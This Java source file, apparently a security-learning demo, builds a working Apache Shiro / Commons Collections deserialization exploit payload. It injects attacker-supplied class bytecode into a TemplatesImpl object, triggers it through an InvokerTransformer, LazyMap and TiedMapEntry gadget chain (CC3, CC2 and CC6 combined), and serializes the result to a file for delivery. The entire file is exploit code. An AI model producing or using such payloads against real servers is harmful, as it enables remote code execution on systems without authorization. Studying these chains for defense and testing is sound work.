package demo.shiro;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;

public class ShiroCC {

    public static void main(String[] args) throws Exception{
        //CC3
        TemplatesImpl templatesimpl=new TemplatesImpl();

        Class c=templatesimpl.getClass();
        Field _nameField=c.getDeclaredField("_name");
        _nameField.setAccessible(true);
        _nameField.set(templatesimpl,"aaa");

        Field _byteCodesField=c.getDeclaredField("_bytecodes");
        _byteCodesField.setAccessible(true);

        byte[] code= Files.readAllBytes(Paths.get("C:\\demo\\shiro\\Test.class"));
        byte[][] codes= {code};
        _byteCodesField.set(templatesimpl,codes);


        //CC2
        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",null,null);


        //CC6
        HashMap<Object,Object> hashMap1=new HashMap<Object,Object>();
        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,new ConstantTransformer(1));

        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazyMap,templatesimpl);
        HashMap<Object,Object> hashMap2=new HashMap<Object,Object>();
        hashMap2.put(tiedMapEntry,"eee");
        lazyMap.remove(templatesimpl);


        //反射修改LazyMap类的factory属性
        Class clazz=LazyMap.class;
        Field factoryField= clazz.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,invokerTransformer);


        serialize(hashMap2);
        //unserialize("ser.bin");

    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("./data/shirocc.bin"));
        oos.writeObject(obj);
    }

    //反序列化
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object object=ois.readObject();
        return object;
    }
}